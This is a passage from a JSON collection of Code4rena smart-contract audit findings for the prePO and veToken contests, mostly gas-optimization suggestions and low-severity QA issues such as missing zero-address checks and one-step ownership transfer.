is minted by calling `DistributorProxy.distribute` and gauge rewards are claimed by calling `LiquidityGauge.claim_rewards`.\n\nDue to the discrepancies between different protocols in the reward claiming process, additional care must be taken to ensure that the flow of veAsset and gauge rewards are transferred to the appropriate contracts during integration. Otherwise, rewards will be stuck.\n\nLastly, I only see test cases written for claiming veAsset from the gauge. For completeness, it is recommended to also write test cases for claiming extra rewards from the gauge apart from veAsset.\n\n",
    "dataSource": {
      "name": "code-423n4/2022-05-vetoken-findings",
      "repo": "https://github.com/code-423n4/2022-05-vetoken-findings",
      "url": "https://github.com/code-423n4/2022-05-vetoken-findings/issues/209"
    }
  },
  {
    "title": "QA Report",
    "body": "# Lines of code\n\nhttps://github.com/code-423n4/2022-03-prepo/blob/main/contracts/core/Collateral.sol#L15\n\n\n# Vulnerability details\n\n## Impact\n\nBecause the `Collateral.sol` contract utilises `ERC20Upgradeable`, it is expected that this contract will deployed under some proxy contract setup. This gives the contract owner the power to deploy new implementation contracts with different logic but the same storage. However, because the contract owner has these privileges, it is possible for the implementation contract to contain a malicious function allowing them to withdraw all deposited tokens, effectively rugpulling the protocol.\n\n## Proof of Concept\n\n## Tools Used\n\nManual code review.\n\n## Recommended Mitigation Steps\n\nEnsure this is understood and consider making `Collateral.sol` contracts immutable. There is little to no benefit in making the `Collateral.sol` contract upgradable and it adds additional trust dependencies to the protocol.\n\n",
    "dataSource": {
      "name": "code-423n4/2022-03-prepo-findings",
      "repo": "https://github.com/code-423n4/2022-03-prepo-findings",
      "url": "https://github.com/code-423n4/2022-03-prepo-findings/issues/128"
    }
  },
  {
    "title": "Gas Optimizations",
    "body": "#1 Prefix increment are cheaper than postfix increment\nhttps://github.com/code-423n4/2022-03-prepo/blob/main/contracts/core/AccountAccessController.sol#L44\nhttps://github.com/code-423n4/2022-03-prepo/blob/main/contracts/core/AccountAccessController.sol#L55\nits better using ++i instead i++ then using `unchecked` for all `i` on `for` loop:\n```\n for (uint256 _i = 0; _i < _accounts.length;) {\n            _allowedAccounts[_allowedAccountsIndex][_accounts[_i]] = true;\n            emit AccountAllowed(_accounts[_i]);\n\t    unchecked{++i;}\n        }\n```\n\n#2 Unnecessary `clearAllowedAccount()` function\nhttps://github.com/code-423n4/2022-03-prepo/blob/main/contracts/core/AccountAccessController.sol#L21\nIts gas consuming by running `_clearAllowedAccounts()` function inside `clearAllowedAccount()`. Just remove `clearAllowedAccount()` function\nand run `_clearAllowedAccounts()` directly (also move all the modifier needed such as `onlyOwner`, and change the function visibility), Just like how `clearBlockedAccounts()` works. Same solution can applied to `setRoot()` function (L17)\n\n#3 Using `require()` instead `if()` and `else`\nhttps://github.com/code-423n4/2022-03-prepo/blob/main/contracts/core/CollateralDepositRecord.sol#L41-L56\nUsing `require()` to validate the transaction can save gas and throw an error if the condition wasn’t passed\n```\n require(_globalDepositAmount >= _amount);\n require(_accountToNetDeposit[_sender] >= _amount);\n         _globalDepositAmount -= _amount;\n\n_accountToNetDeposit[_sender] -= _amount;\n\n```\n\n#4 Using multiple `require()` cost less gas then `&&`\nhttps://github.com/code-423n4/2022-03-prepo/blob/main/contracts/core/DepositHook.sol#L31-L35\nUsing && can cost more execution gas.\n```\nrequire(\n\n            _accountAccessController.isAccountAllowed(_sender),\n\n            \"Account not allowed to deposit\"\n\n        );\nrequire(\n\n            !_accountAccessController.isAccountBlocked(_sender),\n\n            \"Account not allowed to deposit\"\n\n        );\n\n\n```\n\n#5 Caching `_finalLongPrice` to memory can save gas\nhttps://github.com/code-423n4/2022-03-prepo/blob/main/contracts/core/PrePOMarket.sol#L110\nhttps://github.com/code-423n4/2022-03-prepo/blob/main/contracts/core/PrePOMarket.sol#L145\nhttps://github.com/code-423n4/2022-03-prepo/blob/main/contracts/core/PrePOMarket.sol#L146\nhttps://github.com/code-423n4/2022-03-prepo/blob/main/contracts/core/PrePOMarket.sol#L148\nMaking a new local variable to store `_finalLongPrice` instead of read it multiple times from storage can save gas. Currently the variable was called multiple times in `redeem()` function\n\n#6 Using `unchecked` when setting the `_shortPrice` value\nhttps://github.com/code-423n4/2022-03-prepo/blob/main/contracts/core/PrePOMarket.sol#L146\nOn L146, the `_finalLongPrice` value won't > `MAX_PRICE` value (it can't be underflow). Therefore, using `unchecked` can save gas\n```\nUnchecked{uint256 _shortPrice = MAX_PRICE - _finalLongPrice;}\n```\n\n#7 read from input parameter can save gas when emitting an event\nhttps://github.com/code-423n4/2022-03-prepo/blob/main/contracts/core/CollateralDepositRecord.sol#L64\nChange to:\n```\n        emit GlobalDepositCapChanged(_newGlobalDepositCap);\n\n```\n\n#8 Saving gas by calling library.function directly\nhttps://github.com/code-423n4/2022-03-prepo/blob/main/contracts/core/Collateral.sol#L19\nBy removing the L19 and call `library.function()` directly can save execution gas cost per call:\nhttps://github.com/code-423n4/2022-03-prepo/blob/main/contracts/core/Collateral.sol#L59\n```\nSafeERC20Upgradeable.safeTransferFrom(_baseToken, msg.sender, address(this), _amount);\n```\n\n#9 using `delete` can save gas\nhttps://github.com/code-423n4/2022-03-prepo/blob/main/contracts/core/Collateral.sol#L133-L134\nUsing delete to set the value to 0 can save gas\n```\n        delete _accountToWithdrawalRequest[_account].amount;\n        delete _accountToWithdrawalRequest[_account].blockNumber;\n\n\n```",
    "dataSource": {
      "name": "code-423n4/2022-03-prepo-findings",
      "repo": "https://github.com/code-423n4/2022-03-prepo-findings",
      "url": "https://github.com/code-423n4/2022-03-prepo-findings/issues/126"
    }
  },
  {
    "title": "Gas Optimizations",
    "body": "# Gas Report\n\n**Table of Contents:**\n\n- [Gas Report](#gas-report)\n  - [Foreword](#foreword)\n  - [File: PrePOMarket.sol](#file-prepomarketsol)\n    - [Tighly pack storage variables](#tighly-pack-storage-variables)\n    - [function redeem()](#function-redeem)\n      - [Cache `_finalLongPrice`](#cache-_finallongprice)\n  - [File: CollateralDepositRecord.sol](#file-collateraldepositrecordsol)\n    - [function recordDeposit()](#function-recorddeposit)\n      - [Cache `_amount + _globalDepositAmount`](#cache-_amount--_globaldepositamount)\n      - [Cache `_amount + _accountToNetDeposit[_sender]`](#cache-_amount--_accounttonetdeposit_sender)\n    - [function recordWithdrawal()](#function-recordwithdrawal)\n      - [Cache `_globalDepositAmount`](#cache-_globaldepositamount)\n      - [Cache `_accountToNetDeposit`](#cache-_accounttonetdeposit)\n  - [General recommendations](#general-recommendations)\n    - [Storage Variables](#storage-variables)\n      - [Emitting storage values instead of caching of function arguments](#emitting-storage-values-instead-of-caching-of-function-arguments)\n      - [Incrementing before emitting a storage value instead of emitting the increment's result](#incrementing-before-emitting-a-storage-value-instead-of-emitting-the-increments-result)\n      - [Some storage variables should be immutable](#some-storage-variables-should-be-immutable)\n      - [Help the optimizer by declaring a storage variable instead of repeatedly fetching the value](#help-the-optimizer-by-declaring-a-storage-variable-instead-of-repeatedly-fetching-the-value)\n    - [For-Loops](#for-loops)\n      - [An array's length should be cached to save gas in for-loops](#an-arrays-length-should-be-cached-to-save-gas-in-for-loops)\n      - [`++i` costs less gas compared to `i++`](#i-costs-less-gas-compared-to-i)\n      - [Increments can be unchecked](#increments-can-be-unchecked)\n    - [Arithmetics](#arithmetics)\n      - [Uncheck calculations to save gas when an overflow/underflow is impossible](#uncheck-calculations-to-save-gas-when-an-overflowunderflow-is-impossible)\n    - [Errors](#errors)\n      - [Use Custom Errors instead of Revert Strings to save Gas](#use-custom-errors-instead-of-revert-strings-to-save-gas)\n\n## Foreword\n\n- **Storage-reading optimizations**\n\n> The code can be optimized by minimising the number of SLOADs. SLOADs are expensive (100 gas) compared to MLOADs/MSTOREs (3 gas). In the paragraphs below, please see the `@audit-issue` tags in the pieces of code's comments for more information about SLOADs that could be saved by caching the mentioned **storage** variables in **memory** variables.\n\n- **Unchecking arithmetics operations that can't underflow/overflow**\n\n> Solidity version 0.8+ comes with implicit overflow and underflow checks on unsigned integers. When an overflow or an underflow isn't possible (as an example, when a comparison is made before the arithmetic operation, or the operation doesn't depend on user input), some gas can be saved by using an `unchecked` block: <https://docs.soliditylang.org/en/v0.8.10/control-structures.html#checked-or-unchecked-arithmetic>\n\n- **`@audit` tags**\n\n> The code is annotated at multiple places with `//@audit` comments to pinpoint the issues. Please, pay attention to them for more details.\n\n## File: PrePOMarket.sol\n\n### Tighly pack storage variables\n\nHere, storage variables can be tightly packed from:\n\n```solidity\nFile: PrePOMarket.sol\n11:     address private _treasury; //@audit 20 bytes\n12: \n13:     IERC20 private immutable _collateral;\n14:     ILongShortToken private immutable _longToken;\n15:     ILongShortToken private immutable _shortToken;\n16: \n17:     uint256 private immutable _floorLongPrice;\n18:     uint256 private immutable _ceilingLongPrice;\n19:     uint256 private _finalLongPrice;//@audit 32 bytes\n20: \n21:     uint256 private immutable _floorValuation;\n22:     uint256 private immutable _ceilingValuation;\n23: \n24:     uint256 private _mintingFee;\n25:     uint256 private _redemptionFee;//@audit 32 bytes\n26: \n27:     uint256 private immutable _expiryTime;\n28: \n29:     bool private _publicMinting; //@audit 1 byte, but taking 1 slot. Can be tightly packed\n```\n\nto\n\n```solidity\nFile: PrePOMarket.sol\n11:     address private _treasury; //@audit 20 bytes\n12:     \n13:     bool private _publicMinting; //@audit 1 byte\n14: \n15:     IERC20 private immutable _collateral;\n16:     ILongShortToken private immutable _longToken;\n17:     ILongShortToken private immutable _shortToken;\n18: \n19:     uint256 private immutable _floorLongPrice;\n20:     uint256 private immutable _ceilingLongPrice;\n21:     uint256 private _finalLongPrice;//@audit 32 bytes\n22: \n23:     uint256 private immutable _floorValuation;\n24:     uint256 private immutable _ceilingValuation;\n25: \n26:     uint256 private _mintingFee;\n27:     uint256 private _redemptionFee;//@audit 32 bytes\n28: \n29:     uint256 private immutable _expiryTime;\n```\n\nWhich would save 1 storage slot.\n\n### function redeem()\n\n#### Cache `_finalLongPrice`\n\nCaching this in memory can save around 2 SLOADs (around 200 gas)\n\n```solidity\nFile: PrePOMarket.sol\n145:         if (_finalLongPrice <= MAX_PRICE) { //@audit _finalLongPrice SLOAD 1\n146:             uint256 _shortPrice = MAX_PRICE - _finalLongPrice; //@audit _finalLongPrice SLOAD 2\n147:             _collateralOwed =\n148:                 (_finalLongPrice * _longAmount + _shortPrice * _shortAmount) / //@audit _finalLongPrice SLOAD 3\n149:                 MAX_PRICE;\n```\n\n## File: CollateralDepositRecord.sol\n\n### function recordDeposit()\n\n```solidity\nFile: CollateralDepositRecord.sol\n24:     function recordDeposit(address _sender, uint256 _amount)\n25:         external\n26:         override\n27:         onlyAllowedHooks\n28:     {\n29:         require(\n30:             _amount + _globalDepositAmount <= _globalDepositCap, //@audit 1st _amount + _globalDepositAmount\n31:             \"Global deposit cap exceeded\"\n32:         );\n33:         require(\n34:             _amount + _accountToNetDeposit[_sender] <= _accountDepositCap, //@audit 1st _amount + _accountToNetDeposit[_sender]\n35:             \"Account deposit cap exceeded\"\n36:         );\n37:         _globalDepositAmount += _amount; //@audit 2nd _amount + _globalDepositAmount\n38:         _accountToNetDeposit[_sender] += _amount; //@audit 2nd _amount + _accountToNetDeposit[_sender]\n39:     }\n```\n\n#### Cache `_amount + _globalDepositAmount`\n\n#### Cache `_amount + _accountToNetDeposit[_sender]`\n\nOptimized code:\n\n```solidity\nFile: CollateralDepositRecord.sol\n24:     function recordDeposit(address _sender, uint256 _amount)\n25:         external\n26:         override\n27:         onlyAllowedHooks\n28:     {\n29:         uint256 _newGlobalDepositAmount = _amount + _globalDepositAmount;\n30:         uint256 _newAccountToNetDeposit = _amount + _accountToNetDeposit[_sender];\n31:         require(\n32:             _newGlobalDepositAmount <= _globalDepositCap,\n33:             \"Global deposit cap exceeded\"\n34:         );\n35:         require(\n36:             _newAccountToNetDeposit <= _accountDepositCap,\n37:             \"Account deposit cap exceeded\"\n38:         );\n39:         _globalDepositAmount = _newGlobalDepositAmount;\n40:         _accountToNetDeposit[_sender] = _newAccountToNetDeposit; \n41:     }\n```\n\n### function recordWithdrawal()\n\n```solidity\n41:     function recordWithdrawal(address _sender, uint256 _amount)\n42:         external\n43:         override\n44:         onlyAllowedHooks\n45:     {\n46:         if (_globalDepositAmount > _amount) { //@audit _globalDepositAmount SLOAD 1\n47:             _globalDepositAmount -= _amount; //@audit _globalDepositAmount SLOAD 2\n48:         } else {\n49:             _globalDepositAmount = 0;\n50:         }\n51:         if (_accountToNetDeposit[_sender] > _amount) { //@audit _accountToNetDeposit SLOAD 1\n52:             _accountToNetDeposit[_sender] -= _amount; //@audit _accountToNetDeposit SLOAD 2\n53:         } else {\n54:             _accountToNetDeposit[_sender] = 0;\n55:         }\n56:     }\n```\n\n#### Cache `_globalDepositAmount`\n\n#### Cache `_accountToNetDeposit`\n\nOptimized code:\n\n```solidity\nFile: CollateralDepositRecord.sol\n41:     function recordWithdrawal(address _sender, uint256 _amount)\n42:         external\n43:         override\n44:         onlyAllowedHooks\n45:     {\n46:         uint256 __globalDepositAmount = _globalDepositAmount;\n47:         if (__globalDepositAmount > _amount) {\n48:             _globalDepositAmount = __globalDepositAmount - _amount;\n49:         } else {\n50:             _globalDepositAmount = 0;\n51:         }\n52:         uint256 __accountToNetDeposit = _accountToNetDeposit[_sender];\n53:         if (__accountToNetDeposit > _amount) { \n54:             _accountToNetDeposit[_sender] = __accountToNetDeposit - _amount;\n55:         } else {\n56:             _accountToNetDeposit[_sender] = 0;\n57:         }\n58:     }\n```\n\n## General recommendations\n\n### Storage Variables\n\n#### Emitting storage values instead of caching of function arguments\n\nEmitting a storage value can be avoided to save a SLOAD at these places by using the function argument instead:\n\n```solidity\ncontracts/core/AccountAccessController.sol:\n  96          _root = _newRoot;\n  97:         emit RootChanged(_root); //@audit should emit _newRoot\n\ncontracts/core/Collateral.sol:\n  191          _strategyController = _newStrategyController;\n  192:         emit StrategyControllerChanged(address(_strategyController));//@audit should emit address(_strategyController)\n\n  200          _delayedWithdrawalExpiry = _newDelayedWithdrawalExpiry;\n  201:         emit DelayedWithdrawalExpiryChanged(_delayedWithdrawalExpiry); //@audit should emit address(_newDelayedWithdrawalExpiry)\n\n  210          _mintingFee = _newMintingFee;\n  211:         emit MintingFeeChanged(_mintingFee); //@audit should emit address(_newMintingFee)\n\n  220          _redemptionFee = _newRedemptionFee;\n  221:         emit RedemptionFeeChanged(_redemptionFee); //@audit should emit address(_newRedemptionFee)\n\n  229          _depositHook = _newDepositHook;\n  230:         emit DepositHookChanged(address(_depositHook)); //@audit should emit address(_depositHook)\n\n  238          _withdrawHook = _newWithdrawHook;\n  239:         emit WithdrawHookChanged(address(_withdrawHook)); //@audit should emit address(_newWithdrawHook)\n\ncontracts/core/CollateralDepositRecord.sol:\n  63          _globalDepositCap = _newGlobalDepositCap;\n  64:         emit GlobalDepositCapChanged(_globalDepositCap); //@audit should emit _newGlobalDepositCap\n```\n\n#### Incrementing before emitting a storage value instead of emitting the increment's result\n\nThese can be optimized:\n\n```solidity\ncontracts/core/AccountAccessController.sol:\n   35          _blockedAccountsIndex++;\n   36:         emit BlockedAccountsCleared(_blockedAccountsIndex); //@audit should use ++_blockedAccountsIndex\n\n  101          _allowedAccountsIndex++;\n  102:         emit AllowedAccountsCleared(_allowedAccountsIndex); //@audit should use ++_allowedAccountsIndex\n```\n\nto\n\n```solidity\ncontracts/core/AccountAccessController.sol:\n   35:         emit BlockedAccountsCleared(++_blockedAccountsIndex);\n\n  101:         emit AllowedAccountsCleared(++_allowedAccountsIndex);\n```\n\n#### Some storage variables should be immutable\n\nMarking these as immutable (as they never change outside the constructor) would avoid them taking space in the storage:\n\n```solidity\ncontracts/core/Collateral.sol:\n  23:     address private _treasury;//@audit should be immutable\n  26:     IERC20Upgradeable private _baseToken; //@audit should be immutable\n\ncontracts/core/DepositHook.sol:\n  11:     IAccountAccessController private _accountAccessController; //@audit should be immutable\n  12:     ICollateralDepositRecord private _depositRecord; //@audit should be immutable\n\ncontracts/core/WithdrawHook.sol:\n  10:     ICollateralDepositRecord private _depositRecord; //@audit should be immutable\n```\n\n#### Help the optimizer by declaring a storage variable instead of repeatedly fetching the value\n\nTo help the optimizer, go from:\n\n```solidity\nFile: AccountAccessController.sol\n61:     function allowSelf(bytes32[] calldata _proof) external override {\n62:         require(\n63:             _allowedAccounts[_allowedAccountsIndex][msg.sender] == false, //@audit help the optimizer + use just require(!_allowedAccounts[_allowedAccountsIndex][msg.sender]) as this here is a comparison to a constant\n...\n69:         _allowedAccounts[_allowedAccountsIndex][msg.sender] = true; //@audit help the optimizer\n```\n\nto\n\n```solidity\nFile: AccountAccessController.sol\n     function allowSelf(bytes32[] calldata _proof) external override {\n         bool storage _accountAllowed = _allowedAccounts[_allowedAccountsIndex][msg.sender];\n         require(\n             _accountAllowed == false,\n...\n         _accountAllowed = true;\n\n```\n\nAlso here, use `require(!_allowedAccounts[_allowedAccountsIndex][msg.sender])` at L63 to avoid the cost of a comparison to a constant.\n\n### For-Loops\n\n#### An array's length should be cached to save gas in for-loops\n\nReading array length at each iteration of the loop takes 6 gas (3 for mload and 3 to place memory_offset) in the stack.  \n  \nCaching the array length in the stack saves around 3 gas per iteration.  \n\nHere, I suggest storing the array's length in a variable before the for-loop, and use it instead:\n\n```solidity\ncore/AccountAccessController.sol:44:        for (uint256 _i = 0; _i < _accounts.length; _i++) {\ncore/AccountAccessController.sol:55:        for (uint256 _i = 0; _i < _accounts.length; _i++) {\n```\n\n#### `++i` costs less gas compared to `i++`\n\n`++i` costs less gas compared to `i++` for unsigned integer, as pre-increment is cheaper (about 5 gas per iteration)  \n\n`i++` increments `i` and returns the initial value of `i`. Which means:  \n  \n```solidity\nuint i = 1;  \ni++; // == 1 but i == 2  \n```\n  \nBut `++i` returns the actual incremented value:  \n  \n```solidity\nuint i = 1;  \n++i; // == 2 and i == 2 too, so no need for a temporary variable  \n```\n  \nIn the first case, the compiler has to create a temporary variable (when used) for returning `1` instead of `2`  \n  \nInstances include:  \n\n```solidity\ncore/AccountAccessController.sol:35:        _blockedAccountsIndex++;\ncore/AccountAccessController.sol:44:        for (uint256 _i = 0; _i < _accounts.length; _i++) {\ncore/AccountAccessController.sol:55:        for (uint256 _i = 0; _i < _accounts.length; _i++) {\ncore/AccountAccessController.sol:101:        _allowedAccountsIndex++;\n```\n\nI suggest using `++i` instead of `i++` to increment the value of an uint variable.\n\n#### Increments can be unchecked\n\nIn Solidity 0.8+, there's a default overflow check on unsigned integers. It's possible to uncheck this in for-loops and save some gas at each iteration, but at the cost of some code readability, as this uncheck cannot be made inline.  \n  \n[ethereum/solidity#10695](https://github.com/ethereum/solidity/issues/10695)\n\nInstances include:  \n\n```solidity\ncore/AccountAccessController.sol:44:        for (uint256 _i = 0; _i < _accounts.length; _i++) {\ncore/AccountAccessController.sol:55:        for (uint256 _i = 0; _i < _accounts.length; _i++) {\n```\n\nThe code would go from:  \n  \n```solidity\nfor (uint256 i; i < numIterations; i++) {  \n // ...  \n}  \n```\n\nto:  \n\n```solidity\nfor (uint256 i; i < numIterations;) {  \n // ...  \n unchecked { ++i; }  \n}  \n```\n\nThe risk of overflow is inexistant for a `uint256` here.\n\n### Arithmetics  \n\n#### Uncheck calculations to save gas when an overflow/underflow is impossible\n\nInstances include:\n\n```solidity\ncontracts/core/Collateral.sol:\n   71          require(_amountToDeposit > _fee, \"Deposit amount too small\");\n   72          _baseToken.safeTransfer(_treasury, _fee);\n   73:         _amountToDeposit -= _fee; //@audit uncheck (see L71)\n\n  169          require(_amountWithdrawn > _fee, \"Withdrawal amount too small\");\n  170          _baseToken.safeTransfer(_treasury, _fee);\n  171:         _amountWithdrawn -= _fee; //@audit uncheck (see L169)\n\ncontracts/core/CollateralDepositRecord.sol:\n  46          if (_globalDepositAmount > _amount) { \n  47:             _globalDepositAmount -= _amount; //@audit uncheck (see L46)\n\n  51          if (_accountToNetDeposit[_sender] > _amount) {\n  52:             _accountToNetDeposit[_sender] -= _amount; //@audit uncheck (see L51)\n\ncontracts/core/PrePOMarket.sol:\n  120         require(_amount > _fee, \"Minting amount too small\");\n  121          _collateral.transferFrom(msg.sender, _treasury, _fee);\n  122:         _amount -= _fee; //@audit uncheck (see L120)\n\n  167          require(_collateralOwed > _fee, \"Redemption amount too small\");\n  168          _collateral.transfer(_treasury, _fee);\n  169:         _collateralOwed -= _fee; //@audit uncheck (see L167)\n```\n\n### Errors\n\n#### Use Custom Errors instead of Revert Strings to save Gas\n\nCustom errors from Solidity 0.8.4 are cheaper than revert strings (cheaper deployment cost and runtime cost when the revert condition is met)\n\nSource: <https://blog.soliditylang.org/2021/04/21/custom-errors/>:\n> Starting from [Solidity v0.8.4](https://github.com/ethereum/solidity/releases/tag/v0.8.4), there is a convenient and gas-efficient way to explain to users why an operation failed through the use of custom errors. Until now, you could already use strings to give more information about failures (e.g., `revert(\"Insufficient funds.\");`), but they are rather expensive, especially when it comes to deploy cost, and it is difficult to use dynamic information in them.\n\nCustom errors are defined using the `error` statement, which can be used inside and outside of contracts (including interfaces and libraries).\n\nInstances include:\n\n```solidity\ncore/AccountAccessController.sol:62:        require(\ncore/AccountAccessController.sol:68:        require(MerkleProof.verify(_proof, _root, _leaf), \"Invalid proof\");\ncore/Collateral.sol:58:        require(_depositsAllowed, \"Deposits not allowed\");\ncore/Collateral.sol:71:        require(_amountToDeposit > _fee, \"Deposit amount too small\");\ncore/Collateral.sol:101:        require(balanceOf(msg.sender) >= _amount, \"Insufficient balance\");\ncore/Collateral.sol:118:        require(\ncore/Collateral.sol:124:        require(\ncore/Collateral.sol:128:        require(\ncore/Collateral.sol:143:        require(_withdrawalsAllowed, \"Withdrawals not allowed\");\ncore/Collateral.sol:169:        require(_amountWithdrawn > _fee, \"Withdrawal amount too small\");\ncore/Collateral.sol:209:        require(_newMintingFee <= FEE_LIMIT, \"Exceeds fee limit\");\ncore/Collateral.sol:219:        require(_newRedemptionFee <= FEE_LIMIT, \"Exceeds fee limit\");\ncore/CollateralDepositRecord.sol:15:        require(_allowedHooks[msg.sender], \"Caller not allowed\");\ncore/CollateralDepositRecord.sol:29:        require(\ncore/CollateralDepositRecord.sol:33:        require(\ncore/DepositHook.sol:22:        require(msg.sender == _vault, \"Caller is not the vault\");\ncore/DepositHook.sol:31:        require(\ncore/PrePOMarket.sol:58:        require(\ncore/PrePOMarket.sol:62:        require(_newExpiryTime > block.timestamp, \"Invalid expiry\");\ncore/PrePOMarket.sol:63:        require(_newMintingFee <= FEE_LIMIT, \"Exceeds fee limit\");\ncore/PrePOMarket.sol:64:        require(_newRedemptionFee <= FEE_LIMIT, \"Exceeds fee limit\");\ncore/PrePOMarket.sol:65:        require(_newCeilingLongPrice <= MAX_PRICE, \"Ceiling cannot exceed 1\");\ncore/PrePOMarket.sol:108:            require(_publicMinting, \"Public minting disabled\");\ncore/PrePOMarket.sol:110:        require(_finalLongPrice > MAX_PRICE, \"Market ended\");\ncore/PrePOMarket.sol:111:        require(\ncore/PrePOMarket.sol:120:        require(_amount > _fee, \"Minting amount too small\");\ncore/PrePOMarket.sol:135:        require(\ncore/PrePOMarket.sol:139:        require(\ncore/PrePOMarket.sol:151:            require(\ncore/PrePOMarket.sol:167:        require(_collateralOwed > _fee, \"Redemption amount too small\");\ncore/PrePOMarket.sol:185:        require(\ncore/PrePOMarket.sol:189:        require(\ncore/PrePOMarket.sol:202:        require(_newMintingFee <= FEE_LIMIT, \"Exceeds fee limit\");\ncore/PrePOMarket.sol:212:        require(_newRedemptionFee <= FEE_LIMIT, \"Exceeds fee limit\");\ncore/PrePOMarketFactory.sol:55:        require(_validCollateral[_collateral], \"Invalid collateral\");\ncore/SingleStrategyController.sol:22:        require(msg.sender == _vault, \"Caller is not the vault\");\ncore/SingleStrategyController.sol:27:        require(address(_token) != address(0), \"Zero address\");\ncore/WithdrawHook.sol:17:        require(msg.sender == _vault, \"Caller is not the vault\");\n```\n\nI suggest replacing revert strings with custom errors.\n",
    "dataSource": {
      "name": "code-423n4/2022-03-prepo-findings",
      "repo": "https://github.com/code-423n4/2022-03-prepo-findings",
      "url": "https://github.com/code-423n4/2022-03-prepo-findings/issues/124"
    }
  },
  {
    "title": "QA Report",
    "body": "2022-03-prepo\n\n1 import IERC20 instead of ERC20 in PrePOMarket.\n\nhttps://github.com/code-423n4/2022-03-prepo/blob/main/contracts/core/PrePOMarket.sol#L6\n\nimport \"@openzeppelin/contracts/token/ERC20/IERC20.sol\";\n\n2 delete an unused import statement. IERC20 is never used in PrePOMarketFactory.\n\nhttps://github.com/code-423n4/2022-03-prepo/blob/main/contracts/core/PrePOMarketFactory.sol#L7\n\nDelete it.\n\n\n",
    "dataSource": {
      "name": "code-423n4/2022-03-prepo-findings",
      "repo": "https://github.com/code-423n4/2022-03-prepo-findings",
      "url": "https://github.com/code-423n4/2022-03-prepo-findings/issues/119"
    }
  },
  {
    "title": "QA Report",
    "body": "# C4-001 : Incompatibility With Rebasing/Deflationary/Inflationary tokens\n\n## Impact -  LOW\n\nPrePo protocol do not appear to support rebasing/deflationary/inflationary tokens whose balance changes during transfers or over time. The necessary checks include at least verifying the amount of tokens transferred to contracts before and after the actual transfer to infer any fees/interest.\n\n## Proof of Concept\n\n1. Navigate to the following contract.\n\n```\nhttps://github.com/code-423n4/2022-03-prepo/blob/d62d7146b27fd39a5f1358ffde08766724886cf5/contracts/core/PrePOMarket.sol#L168\n```\n\n## Tools Used\n\nManual Code Review\n\n## Recommended Mitigation Steps\n\n- Ensure that to check previous balance/after balance  equals to amount for any rebasing/inflation/deflation\n- Add support in contracts for such tokens before accepting user-supplied tokens\n- Consider supporting deflationary / rebasing / etc tokens by extra checking the balances before/after or strictly inform your users not to use such tokens if they don't want to lose them.\n- \n\n\n# C4-002 : Missing zero-address check in constructors and the setter functions\n\n## Impact -  LOW\n\nMissing checks for zero-addresses may lead to infunctional protocol, if the variable addresses are updated incorrectly.\n\n## Proof of Concept\n\n1. Navigate to the following all contract functions.\n\n```\nhttps://github.com/code-423n4/2022-03-prepo/blob/d62d7146b27fd39a5f1358ffde08766724886cf5/contracts/core/PrePOMarket.sol#L44\n```\n\n## Tools Used\n\nCode Review\n\n## Recommended Mitigation Steps\n\nConsider adding zero-address checks in the discussed constructors:\nrequire(newAddr != address(0));.\n\n# C4-003 : transferOwnership should be two step process\n\n## Impact -  LOW\n\nAll contracts are  inherited from OpenZeppelin's Ownable and OwnableUpgradable contract which enables the onlyOwner role to transfer ownership to another address. It's possible that the onlyOwner role mistakenly transfers ownership to the wrong address, resulting in a loss of the onlyOwner role. The current ownership transfer process involves the current owner calling Unlock.transferOwnership(). This function checks the new owner is not the zero address and proceeds to write the new owner's address into the owner's state variable. If the nominated EOA account is not a valid account, it is entirely possible the owner may accidentally transfer ownership to an uncontrolled account, breaking all functions with the onlyOwner() modifier. Lack of two-step procedure for critical operations leaves them error-prone\nif the address is incorrect, the new address will take on the functionality of the new role immediately\n\nfor Ex : -Alice deploys a new version of the whitehack group address. When she invokes the whitehack group address setter to replace the address, she accidentally enters the wrong address. The new address now has access to the role immediately and is too late to revert\n\n\n## Proof of Concept\n\n1. Navigate to \"https://github.com/code-423n4/2022-03-prepo/blob/d62d7146b27fd39a5f1358ffde08766724886cf5/contracts/core/PrePOMarket.sol#L10\".\n2. The contracts have many onlyOwner function.\n3. The contract is inherited from the Ownable which includes transferOwnership.\n\n## Tools Used\n\nNone\n\n## Recommended Mitigation Steps\n\nImplement zero address check and Consider implementing a two step process where the owner nominates an account and the nominated account needs to call an acceptOwnership() function for the transfer of ownership to fully succeed. This ensures the nominated EOA account is a valid and active account.\n\n# C4-004 : Use of Block.timestamp\n\n## Impact -  Non-Critical\n\nBlock timestamps have historically been used for a variety of applications, such as entropy for random numbers (see the Entropy Illusion for further details), locking funds for periods of time, and various state-changing conditional statements that are time-dependent. Miners have the ability to adjust timestamps slightly, which can prove to be dangerous if block timestamps are used incorrectly in smart contracts.\n\n\n## Proof of Concept\n\n1. Navigate to the following contract.\n\n```\nhttps://github.com/code-423n4/2022-03-prepo/blob/d62d7146b27fd39a5f1358ffde08766724886cf5/contracts/core/PrePOMarket.sol#L62\n```\n\n## Tools Used\n\nManual Code Review\n\n## Recommended Mitigation Steps\n\nBlock timestamps should not be used for entropy or generating random numbers—i.e., they should not be the deciding factor (either directly or through some derivation) for winning a game or changing an important state.\n\nTime-sensitive logic is sometimes required; e.g., for unlocking contracts (time-locking), completing an ICO after a few weeks, or enforcing expiry dates. It is sometimes recommended to use block.number and an average block time to estimate times; with a 10 second block time, 1 week equates to approximately, 60480 blocks. Thus, specifying a block number at which to change a contract state can be more secure, as miners are unable to easily manipulate the block number.\n\n# C4-005 : The Contract Should Approve(0) first\n\n## Impact -  LOW\n\nSome tokens (like USDT L199) do not work when changing the allowance from an existing non-zero allowance value.\nThey must first be approved by zero and then the actual allowance must be approved.\n\n```\nIERC20(token).approve(address(operator), 0);\nIERC20(token).approve(address(operator), amount);\n```\n\n## Proof of Concept\n\n1. Navigate to the following contract functions.\n\n```\nhttps://github.com/code-423n4/2022-03-prepo/blob/d62d7146b27fd39a5f1358ffde08766724886cf5/contracts/core/Collateral.sol#L76\nhttps://github.com/code-423n4/2022-03-prepo/blob/d62d7146b27fd39a5f1358ffde08766724886cf5/contracts/core/SingleStrategyController.sol#L60\nhttps://github.com/code-423n4/2022-03-prepo/blob/d62d7146b27fd39a5f1358ffde08766724886cf5/contracts/core/SingleStrategyController.sol#L62\n```\n\n## Tools Used\n\nNone\n\n## Recommended Mitigation Steps\n\nApprove with a zero amount first before setting the actual amount.\n\n# C4-006 : Front-runnable Initializers\n\n## Impact - LOW\n\nAll contract **initializers** were missing access controls, allowing any user to initialize the contract. By front-running the contract deployers to initialize the contract, the incorrect parameters may be supplied, leaving the contract needing to be redeployed.\n\n\n## Proof of Concept\n\n1. Navigate to the following 